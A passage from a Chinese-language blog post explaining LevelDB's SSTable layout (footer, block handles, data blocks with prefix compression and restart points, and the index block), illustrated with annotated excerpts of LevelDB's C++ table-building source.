class="line">...</span><br></pre></td></tr></table></figure><p>这两种思想在leveldb中都有体现，但是leveldb的挑战要大于组织一个字典。首先字典的是死的，一旦字典组织好，字典不会发生变动，既不会增加新的内容，也不会删除某一个字，leveldb则不同，leveldb是动态变化的，你无法预测用户会插入多少笔key-value的记录，用户可能修改某条key-value对，也可能删除某条记录。</p><p>另外一个难点是字可以穷尽，但是key-value中的key无法穷举。</p><h2 id="2-SSTable的layout"><a href="#2-SSTable的layout" class="headerlink" title="2. SSTable的layout"></a>2. SSTable的layout</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;beginning_of_file&gt;</span><br><span class="line">[data block 1]</span><br><span class="line">[data block 2]</span><br><span class="line">...</span><br><span class="line">[data block N]</span><br><span class="line">[meta block 1]</span><br><span class="line">...</span><br><span class="line">[meta block K]</span><br><span class="line">[metaindex block]</span><br><span class="line">[index block]</span><br><span class="line">[Footer]        (fixed size; starts at file_size - sizeof(Footer))</span><br><span class="line">&lt;end_of_file&gt;</span><br></pre></td></tr></table></figure><p>即：</p><p><img data-src="https://bean-li.github.io/assets/LevelDB/sstable_format.png" alt="img"></p><p>首先SSTtable文件不是固定长度的，从上图中也可以看出，文件的内容要能够自解释，就需要有在固定位置有一定数据结构，顺藤摸瓜，理顺文件的内容。</p><h3 id="1-Footer"><a href="#1-Footer" class="headerlink" title="1.Footer"></a>1.Footer</h3><p>对于leveldb而言，Footer是线头，从Footer开始就可以找到该文件的其他组成部分如index block和metaindex block，进而解释整个文件的内容。</p><p>Footer的长度是固定的，因此对于SSTable文件的最后 sizeof(Footer)字节就是存放的Footer信息。 Footer固定48B，如下图所示：</p><p><img data-src="https://bean-li.github.io/assets/LevelDB/footer-format.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">metaindex_handle: <span class="keyword">char</span>[p];      <span class="comment">// Block handle for metaindex</span></span><br><span class="line">index_handle:     <span class="keyword">char</span>[q];      <span class="comment">// Block handle for index</span></span><br><span class="line">padding:          <span class="keyword">char</span>[<span class="number">40</span>-p-q]; <span class="comment">// zeroed bytes to make fixed length</span></span><br><span class="line"><span class="comment">// (40==2*BlockHandle::kMaxEncodedLength)</span></span><br><span class="line">magic:            fixed64;      <span class="comment">// == 0xdb4775248b80fb57 (little-endian)</span></span><br></pre></td></tr></table></figure><p>其中最后的magic number是固定的长度的8字节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static const uint64_t kTableMagicNumber &#x3D; 0xdb4775248b80fb57ull;</span><br></pre></td></tr></table></figure><p>为了文件的自解释，内部必须要有指针指向文件的其他位置来表示某个section的开始和结束位置。负责记录这个的变量叫做BlockHandle，他有两个成员变量offset_ 和 size_，分别记录的某个数据块的起始位置和长度。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BlockHandle is a pointer to the extent of a file that stores a data</span></span><br><span class="line"><span class="comment">// block or a meta block.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlockHandle</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">uint64_t</span> offset_;</span><br><span class="line">  <span class="keyword">uint64_t</span> size_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个uint64整数经过varint64编码后最大占用10个字节，一个BlockHandle包含两个uint64类型(size和offset)，则一个BlockHandle最多占用20个字节，即BLockHandle::kMaxEncodedLength=20。metaindex_handle和index_handle最大占用字节为40个字节。magic number占用8个字节，是个固定数值，用于读取时校验是否跟填充时相同，不相同的话就表示此文件不是一个SSTable文件(bad magic number)。padding用于补齐为40字节。</p><p>sstable文件中footer中可以解码出在文件的结尾处距离footer最近的index block的BlockHandle，以及metaindex block的BlockHandle，从而确定这两个组成部分在文件中的位置。</p><p>事实上，在table/table_build.cc中的Status TableBuilder::Finish()函数，我们可以看出，当生成sstable文件的时候，各个组成部分的写入顺序：</p><h3 id="2-sst-layout的源码"><a href="#2-sst-layout的源码" class="headerlink" title="2.sst layout的源码"></a>2.sst layout的源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">TableBuilder::Finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">   <span class="comment">// 写入data block</span></span><br><span class="line">  Flush();<span class="comment">// 写入还在buffer中的data block到文件中</span></span><br><span class="line">  assert(!r-&gt;closed);</span><br><span class="line">  r-&gt;closed = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  BlockHandle filter_block_handle, metaindex_block_handle, index_block_handle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入metablock</span></span><br><span class="line">  <span class="comment">// Write filter block</span></span><br><span class="line">  <span class="keyword">if</span> (ok() &amp;&amp; r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    WriteRawBlock(r-&gt;filter_block-&gt;Finish(), kNoCompression,</span><br><span class="line">                  &amp;filter_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write metaindex block</span></span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    <span class="function">BlockBuilder <span class="title">meta_index_block</span><span class="params">(&amp;r-&gt;options)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="comment">// Add mapping from "filter.Name" to location of filter data</span></span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> key = <span class="string">"filter."</span>;</span><br><span class="line">      key.append(r-&gt;options.filter_policy-&gt;Name());</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">      filter_block_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">      meta_index_block.Add(key, handle_encoding);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO(postrelease): Add stats and other meta blocks</span></span><br><span class="line">    WriteBlock(&amp;meta_index_block, &amp;metaindex_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write index block</span></span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;pending_index_entry) &#123;</span><br><span class="line">      r-&gt;options.comparator-&gt;FindShortSuccessor(&amp;r-&gt;last_key);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">      r-&gt;pending_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">      r-&gt;index_block.Add(r-&gt;last_key, Slice(handle_encoding));</span><br><span class="line">      r-&gt;pending_index_entry = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteBlock(&amp;r-&gt;index_block, &amp;index_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write footer</span></span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    Footer footer;</span><br><span class="line">    footer.set_metaindex_handle(metaindex_block_handle);</span><br><span class="line">    footer.set_index_handle(index_block_handle);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> footer_encoding;</span><br><span class="line">    footer.EncodeTo(&amp;footer_encoding);</span><br><span class="line">    r-&gt;status = r-&gt;file-&gt;Append(footer_encoding);</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;status.ok()) &#123;</span><br><span class="line">      r-&gt;offset += footer_encoding.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> r-&gt;status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里按顺序写入了几种block:</p><ol><li>data block</li><li>meta block<ol><li>filter block （目前已经实现）</li><li>后面可选实现</li></ol></li><li>meta index block</li><li>inde block</li><li>footer</li></ol><h2 id="3-Data-Block"><a href="#3-Data-Block" class="headerlink" title="3. Data Block"></a>3. Data Block</h2><p>data block里面存放的东西很简单，就是一个个的key/value 数据对。</p><h3 id="1-向SST中写入一个datablock的过程"><a href="#1-向SST中写入一个datablock的过程" class="headerlink" title="1. 向SST中写入一个datablock的过程"></a>1. 向SST中写入一个datablock的过程</h3><h4 id="处理流程图"><a href="#处理流程图" class="headerlink" title="处理流程图"></a>处理流程图</h4><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/写入一个datablock的流程-1600853106778.png" style="zoom:25%;" /><p>通过TableBuilder::Add函数，可以将一个pair加入到TableBuilder中，至于是否写入到sst中，则需要满足一定条件：</p><p>==TableBuilder::Add==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">...</span><br><span class="line">  r-&gt;data_block.Add(key, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> estimated_block_size = r-&gt;data_block.CurrentSizeEstimate();</span><br><span class="line">  <span class="keyword">if</span> (estimated_block_size &gt;= r-&gt;options.block_size) &#123;</span><br><span class="line">    Flush();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当当前data_block的size超过options中的block_size阈值时，将当前的block_size写入到sst中（通过Flush函数）。这也说明，<strong>data_block size不是定长的，但一定是超过4k的（应该是会除了最后一个）。</strong></p><p>options.block_size = 4k</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Approximate size of user data packed per block.  Note that the</span></span><br><span class="line"><span class="comment">// block size specified here corresponds to uncompressed data.  The</span></span><br><span class="line"><span class="comment">// actual size of the unit read from disk may be smaller if</span></span><br><span class="line"><span class="comment">// compression is enabled.  This parameter can be changed dynamically.</span></span><br><span class="line"><span class="keyword">size_t</span> block_size = <span class="number">4</span> * <span class="number">1024</span>;</span><br></pre></td></tr></table></figure><p>==TableBuilder::Flush==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">  assert(!r-&gt;closed);</span><br><span class="line">  <span class="keyword">if</span> (!ok()) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;data_block.empty()) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//  r-&gt;pending_index_entry is true only if data_block is empty.</span></span><br><span class="line">  assert(!r-&gt;pending_index_entry);</span><br><span class="line">    <span class="comment">// 实际写入</span></span><br><span class="line">  WriteBlock(&amp;r-&gt;data_block, &amp;r-&gt;pending_handle);</span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    r-&gt;pending_index_entry = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">// 写入成功与否状态</span></span><br><span class="line">    r-&gt;status = r-&gt;file-&gt;Flush();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="comment">// 应用 filter（根据源码来看，目前应该只支持bloom filter)</span></span><br><span class="line">    r-&gt;filter_block-&gt;StartBlock(r-&gt;offset);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工作:</p><ol><li>写入数据块</li><li>应用filter</li></ol><p>再稍微的深追一下：</p><p>在Flush中又会调用==TableBuilder::WriteBlock==，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::WriteBlock</span><span class="params">(BlockBuilder* block, BlockHandle* handle)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// File format contains a sequence of blocks where each block has:</span></span><br><span class="line">  <span class="comment">//    block_data: uint8[n]</span></span><br><span class="line">  <span class="comment">//    type: uint8</span></span><br><span class="line">  <span class="comment">//    crc: uint32</span></span><br><span class="line">  assert(ok());</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">  Slice raw = block-&gt;Finish();</span><br><span class="line"></span><br><span class="line">  Slice block_contents;</span><br><span class="line">  CompressionType type = r-&gt;options.compression;</span><br><span class="line">  <span class="comment">// TODO(postrelease): Support more compression options: zlib?</span></span><br><span class="line">   <span class="comment">// 压缩</span></span><br><span class="line">  <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">    <span class="keyword">case</span> kNoCompression:</span><br><span class="line">      block_contents = raw;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> kSnappyCompression: &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>* compressed = &amp;r-&gt;compressed_output;</span><br><span class="line">      <span class="keyword">if</span> (port::Snappy_Compress(raw.data(), raw.<span class="built_in">size</span>(), compressed) &amp;&amp;</span><br><span class="line">          compressed-&gt;<span class="built_in">size</span>() &lt; raw.<span class="built_in">size</span>() - (raw.<span class="built_in">size</span>() / <span class="number">8u</span>)) &#123;</span><br><span class="line">        block_contents = *compressed;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Snappy not supported, or compressed less than 12.5%, so just</span></span><br><span class="line">        <span class="comment">// store uncompressed form</span></span><br><span class="line">        block_contents = raw;</span><br><span class="line">        type = kNoCompression;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  WriteRawBlock(block_contents, type, handle);</span><br><span class="line">  r-&gt;compressed_output.<span class="built_in">clear</span>();</span><br><span class="line">  block-&gt;Reset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要是决定了是否对数据进行压缩，然后将处理后的数据交给==WriteRawBlock==处理，同时从这里我们也可以知道，写入一个key value pair，还会附带两个元数据，type和crc。下图给出实际写入一个datablock的数据格式。</p><h4 id="Record的layout"><a href="#Record的layout" class="headerlink" title="Record的layout"></a>Record的layout</h4><p>data N bytes &lt;= 4k(图少写个=)</p><img data-src="../../../图库/datablock格式.png" style="zoom: 33%;" /><p>最后，调用==TableBuilder::WriteRawBlock==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::WriteRawBlock</span><span class="params">(<span class="keyword">const</span> Slice&amp; block_contents,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 CompressionType type, BlockHandle* handle)</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">  handle-&gt;set_offset(r-&gt;offset);</span><br><span class="line">  handle-&gt;set_size(block_contents.<span class="built_in">size</span>());</span><br><span class="line">    <span class="comment">// 写入key value pairs</span></span><br><span class="line">  r-&gt;status = r-&gt;file-&gt;Append(block_contents);</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;status.ok()) &#123;</span><br><span class="line">    <span class="keyword">char</span> trailer[kBlockTrailerSize];</span><br><span class="line">    trailer[<span class="number">0</span>] = type;</span><br><span class="line">    <span class="keyword">uint32_t</span> crc = crc32c::Value(block_contents.data(), block_contents.<span class="built_in">size</span>());</span><br><span class="line">    crc = crc32c::Extend(crc, trailer, <span class="number">1</span>);  <span class="comment">// Extend crc to cover block type</span></span><br><span class="line">    EncodeFixed32(trailer + <span class="number">1</span>, crc32c::Mask(crc));</span><br><span class="line">      <span class="comment">// 写入元数据 type + crc</span></span><br><span class="line">    r-&gt;status = r-&gt;file-&gt;Append(Slice(trailer, kBlockTrailerSize));</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;status.ok()) &#123;</span><br><span class="line">      r-&gt;offset += block_contents.<span class="built_in">size</span>() + kBlockTrailerSize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-DataBlock是如何达到阈值，然后才写入到sst的？"><a href="#2-DataBlock是如何达到阈值，然后才写入到sst的？" class="headerlink" title="2. DataBlock是如何达到阈值，然后才写入到sst的？"></a>2. DataBlock是如何达到阈值，然后才写入到sst的？</h3><p>回到==TableBuilder::Add==函数中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  Rep* r = rep_;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  r-&gt;data_block.Add(key, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> estimated_block_size = r-&gt;data_block.CurrentSizeEstimate();</span><br><span class="line">  <span class="keyword">if</span> (estimated_block_size &gt;= r-&gt;options.block_size) &#123;</span><br><span class="line">    Flush();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>r-&gt;data_block.Add(key, value);</code>为核心：</p><h4 id="前缀压缩机制"><a href="#前缀压缩机制" class="headerlink" title="前缀压缩机制"></a>前缀压缩机制</h4><p>由于在一个data block中存在多个key value paris，且它们相互之间是相互有序的，leveldb为了能够减少冗余存储，使用了key的 前缀压缩机制。假设现在要存储两个key， key1 =”the dog”, key2 = “the world”, 会发现key1和key的前4个字符”the “都是相同的，采用前缀压缩机制，key1继续存储”the dog”,key2只用存储”world”即可。</p><p>除此之外，leveldb在每16次共享后，会取消当前的前缀共享机制，重新存储当前完整的key。</p><p>16次来自：options::block_restart_interval</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Number of keys between restart points for delta encoding of keys.</span></span><br><span class="line"><span class="comment">// This parameter can be changed dynamically.  Most clients should</span></span><br><span class="line"><span class="comment">// leave this parameter alone.</span></span><br><span class="line"><span class="keyword">int</span> block_restart_interval = <span class="number">16</span>;</span><br></pre></td></tr></table></figure><h4 id="datablock的layout"><a href="#datablock的layout" class="headerlink" title="datablock的layout"></a>datablock的layout</h4><p>所以一个datablock内部是长这样的：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/data_block_of_sstable.png" alt="img"></p><p>现在来看看<code>data_block_Add(key,value)</code>里面到底是怎么做的：</p><p>==BlockBuilder::Add==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BlockBuilder::Add</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  <span class="function">Slice <span class="title">last_key_piece</span><span class="params">(last_key_)</span></span>;</span><br><span class="line">  assert(!finished_);</span><br><span class="line">  assert(counter_ &lt;= options_-&gt;block_restart_interval);</span><br><span class="line">  assert(buffer_.empty()  <span class="comment">// No values yet?</span></span><br><span class="line">         || options_-&gt;comparator-&gt;Compare(key, last_key_piece) &gt; <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">size_t</span> shared = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (counter_ &lt; options_-&gt;block_restart_interval) &#123;<span class="comment">// 是否达到16次？</span></span><br><span class="line">      <span class="comment">// 找到与上一个key (last_key_piece)之间共享了多少个字节</span></span><br><span class="line">    <span class="comment">// See how much sharing to do with previous string</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> min_length = <span class="built_in">std</span>::<span class="built_in">min</span>(last_key_piece.<span class="built_in">size</span>(), key.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">while</span> ((shared &lt; min_length) &amp;&amp; (last_key_piece[shared] == key[shared])) &#123;</span><br><span class="line">      shared++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="comment">// 达到block_restart_interval，设置restart_point</span></span><br><span class="line">    <span class="comment">// Restart compression</span></span><br><span class="line">    restarts_.push_back(buffer_.<span class="built_in">size</span>());</span><br><span class="line">    counter_ = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// 剩下的都是非共享的</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> non_shared = key.<span class="built_in">size</span>() - shared;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add "&lt;shared&gt;&lt;non_shared&gt;&lt;value_size&gt;" to buffer_</span></span><br><span class="line">    <span class="comment">// 写入元数据</span></span><br><span class="line">  PutVarint32(&amp;buffer_, shared);</span><br><span class="line">  PutVarint32(&amp;buffer_, non_shared);</span><br><span class="line">  PutVarint32(&amp;buffer_, value.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入数据</span></span><br><span class="line">  <span class="comment">// Add string delta to buffer_ followed by value</span></span><br><span class="line">  buffer_.append(key.data() + shared, non_shared);</span><br><span class="line">  buffer_.append(value.data(), value.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update state</span></span><br><span class="line">    <span class="comment">// 把当前key作为下一个用于比较的key</span></span><br><span class="line">  last_key_.resize(shared);</span><br><span class="line">  last_key_.append(key.data() + shared, non_shared);</span><br><span class="line">  assert(Slice(last_key_) == key);</span><br><span class="line">  counter_++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分代码相对简单，首先确定当前要add的key与之前最后一个加入的key的共享长度，非共享长度，然后写入这些元数据(<shared><non_shared><value_size>)， 接着再写入数据（数据只用写非共享长度即可）。<strong>最后将当前key作为下一次add key的比较对象。</strong></p><p>==前缀压缩的时候当前key主要参照的是他/它前面的一个key，而不是起始点的key。==</p><h4 id="key-value-pair的layout"><a href="#key-value-pair的layout" class="headerlink" title="key value pair的layout"></a>key value pair的layout</h4><p>从上面的代码中，我们可以知道datablock里面一个key value pair的数据格式为：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcva2V5" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/key">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/key<i class="fa fa-external-link"></i></span> value pair的数据格式-1600852877733.png)</p><h2 id="4-Index-Block"><a href="#4-Index-Block" class="headerlink" title="4. Index Block"></a>4. Index Block</h2><p>我们在前面说明了如何存放data block，既然可以存放，那自然可以取出来，问题是应该如何存储，注意到sstable内的datablock是有序的，自然会想到采用二分查找的方法来做搜索。leveldb是如何实现data block的搜索的？答案就在这个index block中。</p><p>index block中存放的是data block的索引。看看index block的类型：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200923192147959.png" alt="image-20200923192147959"></p><p>可以看到index block和data_block都是BlockBuilder类型，意味着index_block和data_block的存储格式是相同的。那index_block中一个entry中的key value分别是什么？</p><p>这里先给出答案，假设index block索引到的块为data_block1, data_block1的key=”key1”, 与data_block1相邻的是data_block2, data_block2的key=’key3’, 则 index block entry的key是处于[“key1”,”key3”]之间的key，这里可以取”key2”, 也即:<br>$$<br>index\  entry 索引的data block 的key &lt;= index\  entry的key &lt;= index\ entry索引的data\ block的下一个data\ block的key<br>$$<br>那index entry的value是什么？既然index entry要能索引一个data block， 这个value就是用来存放这个data block的位置信息的， 也即该data block的(offset,size).</p><h3 id="1-Index-Block中一个Index-entry的数据格式"><a href="#1-Index-Block中一个Index-entry的数据格式" class="headerlink" title="1. Index Block中一个Index entry的数据格式"></a>1. Index Block中一个Index entry的数据格式</h3><p>ok，画个图来说明一下:</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读 (2).png" style="zoom:50%;" /><h3 id="2-什么时候会生成一个Index-entry"><a href="#2-什么时候会生成一个Index-entry" class="headerlink" title="2. 什么时候会生成一个Index entry?"></a>2. 什么时候会生成一个Index 